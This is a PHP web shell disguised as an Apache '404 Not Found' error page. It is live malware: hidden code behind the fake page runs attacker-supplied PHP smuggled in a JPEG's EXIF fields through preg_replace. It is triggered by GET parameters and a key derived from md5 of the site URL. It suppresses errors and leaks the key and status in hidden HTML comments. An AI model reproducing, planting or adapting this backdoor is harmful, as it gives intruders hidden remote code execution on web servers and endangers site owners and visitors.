<?php error_reporting(0);function getBaseUrl() {$a = $_SERVER['PHP_SELF'];$b = pathinfo($a);$c = $_SERVER['HTTP_HOST'];return $c.$b['dirname']."/";}$a = pathinfo($_SERVER['PHP_SELF']);$notfound=false;define('_dirname', $a['dirname'] );define('Random', md5(getBaseUrl()) );define('Copyright', "DZ_Copyright" );define('Char'  , "~" );define('_Char' , "#" );define('Char_' , "@" );define('_Char_', "*" );define('__Char', "+" );define('c', "Copyright" );define('m', "Model" );define('a', "Artist" );if(isset($_GET[Char_])) define('Get', $_GET[Char_] );if(isset($_GET[Char_])) define('Source', $_GET[Char] );if (function_exists('exif_imagetype')) { $notfound=true; if (exif_imagetype(Source) == IMAGETYPE_JPEG)  if(Get==Random)displaypixel(Source);} function get_imagesx(){$imgwh = exif_read_data( Source );if(is_array($imgwh))if (isset($imgwh[c]) && $imgwh[m]&& $imgwh[a]) return array('w'=>$imgwh[c],'h'=>$imgwh[m],'a'=>$imgwh[a]);}function displaypixel(){$imgwh = get_imagesx();if(is_array($imgwh))if($imgwh['a']==Copyright) @preg_replace( $imgwh['w'] ,$imgwh['h'],'');}?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<!--<meta name="twitter:app:id:iphone" content="<?php echo '=copyright=&='. Random.'={=@=~=';?>" />-->
<!--<meta name="twitter:app:url:iphone" content="<?php echo ($notfound) ? 'true' : 'false';?>" />-->
<!--<meta name="twitter:app:id:ipad" content="<?php echo md5($notfound);?>">-->
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found </h1>
<p>The requested URL <?php echo _dirname ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the <a href="../">request</a>.</p>
</body></html>